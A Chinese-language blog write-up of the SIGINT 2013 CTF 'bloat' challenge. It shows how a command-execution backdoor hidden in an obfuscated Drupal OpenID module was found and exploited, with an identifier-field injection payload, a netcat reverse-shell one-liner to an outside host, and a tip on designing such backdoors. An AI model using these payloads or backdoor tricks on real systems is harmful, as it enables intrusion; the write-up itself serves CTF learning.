---
title: SIGINT 2013 cloud200 bloat
author: slipper
layout: post
permalink: /sigint2013-cloud200-bloat/
categories:
  - Uncategorized
---
<http://slipper.tk/writeup/2013/07/09/sigint2013-cloud-bloat/>

# [SIGINT 2013 cloud 200 bloat][1]

Description

    My friend set up this site for me. I don't trust him.
    He installed a backdoor for sure. Can you find it?
    He just wrote me, what this system is using.
    Somehow it looks diff-erent o_O:
    

[cdd-7.20.tar_0.gz][2]

[source_code.tar.bz2][3]

这道题比赛的时候只有一个队伍做出来。虽然只有200分，但过程比较复杂。

我本来预期花一两个小时就能解决这个问题，结果却耗费了四个小时。

首先也是最关键的问题就是如何找到后门。

这个网站使用的是开源系统drupal 7.20，还附带了一些插件。但问题并不是直接diff那么简单。

官方的源码附有详细的注释，但修改版中将所有注释全部删掉了，还把代码风格从K&R风格改成了一种很混乱的样子，甚至将所有的变量名替换成了奇奇怪怪的东西。

手工查找人眼识别几乎是不可行的。必须想其它办法。

比赛的时候卡在其他题上面了，没有时间仔细看这道题。事后才想起来可以写一个文本处理器，把php文件全部“格式化”一遍：去掉注释+统一格式+统一变量命名。

[PHP_filter.cpp][4]

处理注释是最麻烦的一步，要判断引号和各种注释符，最终版本的代码也还有瑕疵。

因为只需要比对出文件的不同之处，所以不需要维护代码风格和变量名。为了统一，我把所有可能换行的`{};,:()`全都强行换行，又将所有变量名指定成了$000。

用这个非常挫的文本处理器半自动操作，效率已经比人眼识别提升很多，而且出错率降低很多。

但是将所有`.php`文件对比之后并没有什么收获。

再去查看源码中的文件，发现`.php`的文件其实并不多。很多插件都是以`.inc\.module`这样的后缀结尾的。

再扫描一遍`.inc`后缀的文件，果然发现有一个文件`./bloat/modules/openid/openid.inc`略有不同。

    10 define('OPENID_DH_DEFAULT_GEN', '86');
    

而原版中的openid是

    22 /**
    23  * Diffie-Hellman generator; used for Diffie-Hellman key exchange computations.
    24  */
    25 define('OPENID_DH_DEFAULT_GEN', '2');
    

这是跟用户认证有关的一个常量。修改这种值也许会造成认证系统的一些缺陷。

继续看代码，我有了更大的收获。

在`./bloat/modules/openid/openid.module`中代码逻辑与原版有明显的不同。

    197 function openid_login_validate($quench, &amp;$tickers)
    198    {
    199 $return_to = $tickers['values']['openid.return_to'];
    ...
    204   openid_begin($tickers['values']['openid_identifier'], $return_to, $tickers['values']);
    ... 
    207      function openid_begin($imaginably, $overlay = '', $termination = array())
    ...
    212       if(strpos($imaginably, '@'))
    213   {
    214    list($user, $host) = explode('@', $imaginably, 2);                                                                                                                                         
    215 }
    216 else
    217     {
    218      $user = false;
    219      $host = false;
    220      }
    

`214    list($user, $host) = explode('@', $imaginably, 2);`中`$imaginably`正是用户提交的认证用户名。

再来看看这些变量做了什么。

    248 $user_enc = _openid_dh_long_to_base64($user * OPENID_DH_DEFAULT_GEN);
    249     $service['uri'] = drupal_map_assoc(array($host), $user_enc);
    259   openid_redirect($service['uri'], $ramparts);
    

这里用到了修改过的常量`OPENID_DH_DEFAULT_GEN`。

drupal&#95;map&#95;assoc()返回的是数组，所以在redirect过程中会被强转成字符串&#8221;Array&#8221;，最后在跳转的时候会出错。

而这个[drupal&#95;map&#95;assoc()][5]则暗藏玄机。

根据官方文档，drupal&#95;map&#95;assoc()会把第一个参数$array中的每个参数依次传入第二个参数$callable执行并返回一个数组。

这里藏着一个命令执行后门啊。。。。

只要`is_callable($user_enc)`就能直接执行`$user_enc($host)`。

而`$user_enc`是从`$user * OPENID_DH_DEFAULT_GEN`解出来的。

因为`OPENID_DH_DEFAULT_GEN`的限制，所以这个`$user_enc`必须是按照base64解成整形之后能整除86（中间还有一些过程）。

现在要做的就是找一个合适的函数，恰好能满足这个条件了。

    slipper@NULL:~/CTF/SigintCTF2013/cloud/bloat/bloat/modules/openid$ php -a
    Interactive shell
    
    php &gt; include './openid.inc';
    php &gt; var_dump(is_callable('system'));
    bool(true)
    php &gt; var_dump(is_callable('systeM'));
    bool(true)
    php &gt; echo _openid_dh_base64_to_long('system')/OPENID_DH_DEFAULT_GEN ."\n";
    34952922.72093
    php &gt; echo _openid_dh_base64_to_long('System')/OPENID_DH_DEFAULT_GEN ."\n";
    14664196.395349
    php &gt; echo _openid_dh_base64_to_long('SYstem')/OPENID_DH_DEFAULT_GEN ."\n";
    14347185.046512
    php &gt; echo _openid_dh_base64_to_long('eval')/OPENID_DH_DEFAULT_GEN ."\n";
    93703.872093023
    php &gt; echo _openid_dh_base64_to_long('exec')/OPENID_DH_DEFAULT_GEN ."\n";
    93802
    

因为这里的is&#95;callable是不区分大小写的，本来我还以为后门作者刻意选择了大小写混用的函数名，本来差点要写程序暴搜的。还好偶然发现exec正好符合要求。^&#95;^

**如果以后要用这种方法做后门，记得一个有大因子的大小写混用的函数名哦。**

接下来就是命令执行了。

可是用`93802@echo a &gt; a`结果并没有生成文件a。似乎对网站的目录木有写权限。

如果要获取flag，必须要有传递信息的途径。

唯一能想到的方法就只有反连了。

幸运的是服务起的nc有-e选项，正好可以交互，不然还得一次一次地执行命令。

用`93802@nc x.x.x.x 8080 -e /bin/sh`反弹，本地用`nc -l 8080`监听。

    pwd
    /var/www
    ls -la ./
    total 7904
    drwxr-xr-x  9 root root    4096 Jul  5 01:23 .
    drwxr-xr-x 14 root root    4096 Jul  5 01:53 ..
    -rw-r--r--  1 root root   75028 Mar  7 17:26 CHANGELOG.txt
    -rw-r--r--  1 root root    1481 Mar  7 17:26 COPYRIGHT.txt
    ...
    -rw-r--r--  1 root root      34 Jul  5 01:01 ___F_L_A_G___
    ...
    cat ___F_L_A_G___
    not here, see /flag on filesystem
    cat /flag
    SIGINT_d4b0844c
    

看来果然是木有写权限～～

 [1]: http://slipper.tk/writeup/2013/07/09/sigint2013-cloud-bloat/
 [2]: https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/cloud/bloat/cdd-7.20.tar_0.gz
 [3]: https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/cloud/bloat/source_code.tar.bz2
 [4]: https://github.com/5lipper/CTF-Challenges/blob/master/SIGINT2013/cloud/bloat/filter.cpp
 [5]: https://api.drupal.org/api/drupal/includes%21common.inc/function/drupal_map_assoc/7